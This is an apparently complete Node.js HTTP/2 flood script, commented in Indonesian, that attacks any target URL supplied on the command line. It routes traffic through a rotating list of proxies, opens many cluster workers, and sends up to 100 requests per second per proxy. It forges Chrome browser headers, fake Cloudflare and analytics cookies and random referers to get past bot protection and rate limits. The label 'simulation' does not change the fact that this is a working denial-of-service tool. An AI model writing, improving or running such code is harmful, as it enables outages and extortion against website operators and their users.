const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const crypto = require('crypto');

const ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'ETIMEDOUT', 'EPROTO', 'EADDRNOTAVAIL'];
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', (e) => { if (e.code && ignoreCodes.includes(e.code)) return false; });
process.on('unhandledRejection', (e) => { if (e.code && ignoreCodes.includes(e.code)) return false; });

const reqmethod = process.argv[2], target = process.argv[3], time = parseInt(process.argv[4]);
const rateIdx = process.argv.indexOf('rate'), threadIdx = process.argv.indexOf('thread');
let ratelimit = rateIdx !== -1 ? parseInt(process.argv[rateIdx + 1]) : 100;
const threads = threadIdx !== -1 ? parseInt(process.argv[threadIdx - 1]) : 8;
const proxyfile = process.argv[process.argv.length - 1];

if (!reqmethod || !target || !proxyfile) {
    console.log("Usage: node httpget.js GET https://target.com 60 rate 100 8 thread proxy.txt");
    process.exit(1);
}

const url = new URL(target);
let proxy = fs.readFileSync(proxyfile, 'utf8').split('\n').filter(p => p.trim().length > 0);
const commonPaths = ['/', '/login', '/search', '/about', '/contact', '/shop', '/blog', '/api/v1/status', '/favicon.ico', '/assets/main.js', '/assets/style.css'];
const referers = ['https://google.com', 'https://facebook.com', 'https://t.co/', 'https://youtube.com', 'https://bing.com', 'https://duckduckgo.com', target];

function encodeFrame(streamId, type, payload, flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    return Buffer.concat([frame, payload]);
}

async function go() {
    const proxyAddr = proxy[Math.floor(Math.random() * proxy.length)];
    if (!proxyAddr) return;
    const [proxyHost, proxyPort] = proxyAddr.split(':');

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        netSocket.once('data', (res) => {
            if (!res.toString().includes('200')) return netSocket.destroy();

            const tlsSocket = tls.connect({
                socket: netSocket, ALPNProtocols: ['h2'], servername: url.hostname,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                rejectUnauthorized: false, minVersion: 'TLSv1.2'
            }, () => {
                if (tlsSocket.alpnProtocol !== 'h2') return tlsSocket.destroy();

                let hpack = new HPACK(), streamId = 1, cycle = 0;
                // Cookie & Session unik per koneksi (per IP Proxy)
                const sessionCookie = `_ga=GA1.1.${Math.floor(Math.random() * 1000000)}; __cf_bm=${crypto.randomBytes(20).toString('hex')}; session=${crypto.randomBytes(12).toString('base64')}`;

                tlsSocket.write(Buffer.concat([Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"), encodeFrame(0, 4, Buffer.alloc(0))]));

                const flood = setInterval(async () => {
                    if (tlsSocket.destroyed) return clearInterval(flood);
                    
                    // Logika 10-100 RPS acak dengan pola fluktuasi
                    let rpsPerIp = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
                    
                    for (let i = 0; i < rpsPerIp; i++) {
                        // Jitter sangat rendah (1ms - 10ms) untuk mendukung RPS tinggi
                        await new Promise(r => setTimeout(r, Math.floor(Math.random() * 9) + 1));

                        const path = Math.random() > 0.3 ? commonPaths[Math.floor(Math.random() * commonPaths.length)] : url.pathname + '?s=' + crypto.randomBytes(4).toString('hex');
                        const ver = Math.floor(Math.random() * 5) + 120;
                        
                        const headers = [
                            [':method', reqmethod], [':authority', url.hostname], [':scheme', 'https'], [':path', path],
                            ['sec-ch-ua', `"Google Chrome";v="${ver}", "Chromium";v="${ver}", "Not=A?Brand";v="24"`],
                            ['sec-ch-ua-mobile', '?0'], ['sec-ch-ua-platform', '"Windows"'],
                            ['user-agent', `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver}.0.0.0 Safari/537.36`],
                            ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                            ['referer', referers[Math.floor(Math.random() * referers.length)]],
                            ['accept-encoding', 'gzip, deflate, br'], ['accept-language', 'en-US,en;q=0.9,id;q=0.8'],
                            ['cookie', sessionCookie], ['sec-fetch-dest', 'document'], ['sec-fetch-mode', 'navigate'], ['sec-fetch-site', 'none']
                        ];
                        
                        if (!tlsSocket.destroyed) {
                            tlsSocket.write(encodeFrame(streamId, 1, hpack.encode(headers), 0x05));
                            streamId += 2;
                            // Reset streamId jika mendekati batas maksimal HTTP/2 (2^31 - 1)
                            if (streamId > 0x7FFFFFFF) streamId = 1; 
                            process.send({ type: 'attempt' });
                        }
                    }
                }, 1000);

                tlsSocket.on('data', (data) => {
                    if (data.toString().includes(':status 200')) process.send({ code: '200' });
                    if (data.toString().includes(':status 429')) process.send({ code: '429' });
                });
            });
            tlsSocket.on('error', () => netSocket.destroy());
        });
    });
    netSocket.on('error', () => {});
}

if (cluster.isMaster) {
    let stats = { '200': 0, '403': 0, '429': 0, 'attempts': 0 };
    console.clear();
    console.log(`\x1b[36m[SYSTEM]\x1b[0m Versi High-Intensity HTTP/2 Simulation`);
    console.log(`\x1b[36m[TARGET]\x1b[0m ${target} | \x1b[33m[THREADS]\x1b[0m ${threads} | \x1b[35m[RPS/IP]\x1b[0m 10-100\n`);

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        worker.on('message', (msg) => {
            if (msg.type === 'attempt') stats.attempts++;
            if (msg.code) stats[msg.code]++;
        });
    }

    const uiInterval = setInterval(() => {
        process.stdout.write(`\r\x1b[32mSENT: ${stats.attempts}\x1b[0m | \x1b[32mOK(200): ${stats['200']}\x1b[0m | \x1b[33mLIMIT(429): ${stats['429']}\x1b[0m | \x1b[31mFAIL(403): ${stats['403']}\x1b[0m`);
    }, 100);

    setTimeout(() => {
        clearInterval(uiInterval);
        console.log("\n\n\x1b[36m[INFO]\x1b[0m Durasi simulasi berakhir.");
        process.exit(0);
    }, time * 1000);
} else {
    // Membuka koneksi baru setiap 300ms untuk rotasi IP proxy yang lebih cepat
    setInterval(go, 300);
}